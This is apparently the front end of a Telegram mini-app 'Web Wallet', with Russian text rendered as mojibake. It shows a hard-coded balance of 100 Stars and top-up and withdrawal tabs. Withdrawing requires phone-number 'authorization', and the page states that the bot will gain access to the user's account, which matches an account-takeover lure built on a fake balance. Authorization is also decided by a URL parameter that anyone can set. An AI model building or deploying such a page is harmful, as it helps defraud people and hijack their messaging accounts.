<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–µ–±-–ö–æ—à–µ–ª–µ–∫</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1a1a1a;
            color: #ffffff;
            min-height: 100vh;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
            color: #ffffff;
        }

        .balance-card {
            background: #2a2a2a;
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 24px;
            text-align: center;
            border: 1px solid #333;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .balance-label {
            font-size: 14px;
            color: #999;
        }

        .tabs {
            display: flex;
            background: #2a2a2a;
            border-radius: 12px;
            padding: 4px;
            margin-bottom: 24px;
            border: 1px solid #333;
        }

        .tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 500;
            color: #999;
        }

        .tab.active {
            background: #3390ec;
            color: #ffffff;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .amount-buttons {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 20px;
        }

        .amount-btn {
            background: #2a2a2a;
            color: #ffffff;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 16px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .amount-btn:hover {
            background: #3a3a3a;
            border-color: #3390ec;
        }

        .amount-btn:active {
            transform: scale(0.95);
        }

        .custom-amount {
            background: #2a2a2a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 16px;
            width: 100%;
            font-size: 16px;
            color: #ffffff;
            margin-bottom: 20px;
        }

        .custom-amount::placeholder {
            color: #666;
        }

        .action-btn {
            background: #3390ec;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            padding: 16px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s;
        }

        .action-btn:hover {
            background: #2980d9;
        }

        .action-btn:active {
            transform: scale(0.95);
        }

        .withdraw-info {
            background: #2a2a2a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
        }

        .withdraw-info h3 {
            color: #3390ec;
            margin-bottom: 8px;
            font-size: 16px;
        }

        .withdraw-info p {
            color: #ccc;
            font-size: 14px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üíª –í–µ–±-–ö–æ—à–µ–ª–µ–∫</h1>
        </div>

        <div class="balance-card">
            <div class="balance-amount">100 ‚≠ê</div>
            <div class="balance-label">–í–∞—à –±–∞–ª–∞–Ω—Å</div>
        </div>

        <div class="tabs">
            <div class="tab active" onclick="switchTab('topup')">üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å</div>
            <div class="tab" onclick="switchTab('withdraw')">üí´ –í—ã–≤–µ—Å—Ç–∏</div>
        </div>

        <!-- –í–∫–ª–∞–¥–∫–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è -->
        <div id="topup-content" class="tab-content active">
            <div class="amount-buttons">
                <button class="amount-btn" onclick="selectAmount(25)">‚≠ê 25</button>
                <button class="amount-btn" onclick="selectAmount(50)">‚≠ê 50</button>
                <button class="amount-btn" onclick="selectAmount(100)">‚≠ê 100</button>
                <button class="amount-btn" onclick="selectAmount(250)">‚≠ê 250</button>
                <button class="amount-btn" onclick="selectAmount(500)">‚≠ê 500</button>
                <button class="amount-btn" onclick="selectAmount(1000)">‚≠ê 1000</button>
            </div>
            
            <input type="number" class="custom-amount" placeholder="–ò–ª–∏ –≤–≤–µ–¥–∏—Ç–µ —Å–≤–æ—é —Å—É–º–º—É" id="custom-topup">
            
            <button class="action-btn" onclick="topupBalance()">üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å</button>
        </div>

        <!-- –í–∫–ª–∞–¥–∫–∞ –≤—ã–≤–æ–¥–∞ -->
        <div id="withdraw-content" class="tab-content">
            <div class="withdraw-info">
                <h3>üîê –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h3>
                <p>–î–ª—è –≤—ã–≤–æ–¥–∞ –∑–≤–µ–∑–¥ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞. –ë–æ—Ç –ø–æ–ª—É—á–∏—Ç –¥–æ—Å—Ç—É–ø –∫ –≤–∞—à–µ–º—É –∞–∫–∫–∞—É–Ω—Ç—É –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –æ–ø–µ—Ä–∞—Ü–∏–∏.</p>
            </div>

            <div id="auth-section">
                <button class="action-btn" onclick="requestPhoneAuth()" style="margin-bottom: 20px;">
                    üì± –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ —Ç–µ–ª–µ—Ñ–æ–Ω
                </button>
            </div>

            <div id="withdraw-section" style="display: none;">
                <div class="withdraw-info">
                    <h3>‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω</h3>
                    <p>–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –≤—ã–≤–µ—Å—Ç–∏ –∑–≤–µ–∑–¥—ã. –í—ã–±–µ—Ä–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞:</p>
                </div>

                <div class="amount-buttons">
                    <button class="amount-btn" onclick="selectWithdrawAmount(25)">‚≠ê 25</button>
                    <button class="amount-btn" onclick="selectWithdrawAmount(50)">‚≠ê 50</button>
                    <button class="amount-btn" onclick="selectWithdrawAmount(100)">‚≠ê 100</button>
                    <button class="amount-btn" onclick="selectWithdrawAmount(250)">‚≠ê 250</button>
                </div>
                
                <input type="number" class="custom-amount" placeholder="–ò–ª–∏ –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞" id="custom-withdraw">
                
                <button class="action-btn" onclick="withdrawStars()">üí´ –í—ã–≤–µ—Å—Ç–∏ –∑–≤–µ–∑–¥—ã</button>
            </div>
        </div>
    </div>

    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();

        let selectedAmount = 0;
        let selectedWithdrawAmount = 0;
        let isAuthorized = false;

        function switchTab(tabName) {
            // –£–±–∏—Ä–∞–µ–º –∞–∫—Ç–∏–≤–Ω—ã–π –∫–ª–∞—Å—Å —Å–æ –≤—Å–µ—Ö –≤–∫–ª–∞–¥–æ–∫
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

            // –î–æ–±–∞–≤–ª—è–µ–º –∞–∫—Ç–∏–≤–Ω—ã–π –∫–ª–∞—Å—Å –∫ –≤—ã–±—Ä–∞–Ω–Ω–æ–π –≤–∫–ª–∞–¥–∫–µ
            event.target.classList.add('active');
            document.getElementById(tabName + '-content').classList.add('active');
        }

        function selectAmount(amount) {
            selectedAmount = amount;
            document.getElementById('custom-topup').value = amount;
            
            // –ü–æ–¥—Å–≤–µ—á–∏–≤–∞–µ–º –≤—ã–±—Ä–∞–Ω–Ω—É—é –∫–Ω–æ–ø–∫—É
            document.querySelectorAll('#topup-content .amount-btn').forEach(btn => {
                btn.style.background = '#2a2a2a';
                btn.style.borderColor = '#333';
            });
            
            event.target.style.background = '#3390ec';
            event.target.style.borderColor = '#3390ec';
        }

        function selectWithdrawAmount(amount) {
            selectedWithdrawAmount = amount;
            document.getElementById('custom-withdraw').value = amount;
            
            // –ü–æ–¥—Å–≤–µ—á–∏–≤–∞–µ–º –≤—ã–±—Ä–∞–Ω–Ω—É—é –∫–Ω–æ–ø–∫—É
            document.querySelectorAll('#withdraw-content .amount-btn').forEach(btn => {
                btn.style.background = '#2a2a2a';
                btn.style.borderColor = '#333';
            });
            
            event.target.style.background = '#3390ec';
            event.target.style.borderColor = '#3390ec';
        }

        function requestPhoneAuth() {
            tg.showConfirm('–î–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –±–æ—Ç –∑–∞–ø—Ä–æ—Å–∏—Ç –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞. –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?', (confirmed) => {
                if (confirmed) {
                    tg.sendData(JSON.stringify({ 
                        action: 'request_phone_auth'
                    }));
                    tg.close();
                }
            });
        }

        function topupBalance() {
            const customAmount = document.getElementById('custom-topup').value;
            const amount = customAmount || selectedAmount;
            
            if (!amount || amount <= 0) {
                tg.showAlert('–í—ã–±–µ—Ä–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è');
                return;
            }

            tg.showConfirm(`–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å –Ω–∞ ${amount} ‚≠ê?`, (confirmed) => {
                if (confirmed) {
                    tg.sendData(JSON.stringify({ 
                        action: 'topup', 
                        amount: amount 
                    }));
                    tg.close();
                }
            });
        }

        function withdrawStars() {
            if (!isAuthorized) {
                tg.showAlert('–°–Ω–∞—á–∞–ª–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ —Ç–µ–ª–µ—Ñ–æ–Ω');
                return;
            }

            const customAmount = document.getElementById('custom-withdraw').value;
            const amount = customAmount || selectedWithdrawAmount;
            
            if (!amount || amount <= 0) {
                tg.showAlert('–í—ã–±–µ—Ä–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞');
                return;
            }

            tg.showConfirm(`–í—ã–≤–µ—Å—Ç–∏ ${amount} ‚≠ê –∑–≤–µ–∑–¥?`, (confirmed) => {
                if (confirmed) {
                    tg.sendData(JSON.stringify({ 
                        action: 'withdraw', 
                        amount: amount 
                    }));
                    tg.close();
                }
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–≥–æ —Å–æ—Å—Ç–æ—è–Ω–∏—è
        function showAuthorizedState() {
            isAuthorized = true;
            document.getElementById('auth-section').style.display = 'none';
            document.getElementById('withdraw-section').style.display = 'block';
        }

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        // –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ —ç—Ç–æ –±—É–¥–µ—Ç –∑–∞–ø—Ä–æ—Å –∫ —Å–µ—Ä–≤–µ—Ä—É
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('authorized') === 'true') {
            showAuthorizedState();
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ –≤ –ø–æ–ª—è
        document.getElementById('custom-topup').addEventListener('input', function() {
            selectedAmount = 0;
            document.querySelectorAll('#topup-content .amount-btn').forEach(btn => {
                btn.style.background = '#2a2a2a';
                btn.style.borderColor = '#333';
            });
        });

        document.getElementById('custom-withdraw').addEventListener('input', function() {
            selectedWithdrawAmount = 0;
            document.querySelectorAll('#withdraw-content .amount-btn').forEach(btn => {
                btn.style.background = '#2a2a2a';
                btn.style.borderColor = '#333';
            });
        });
    </script>
</body>
</html>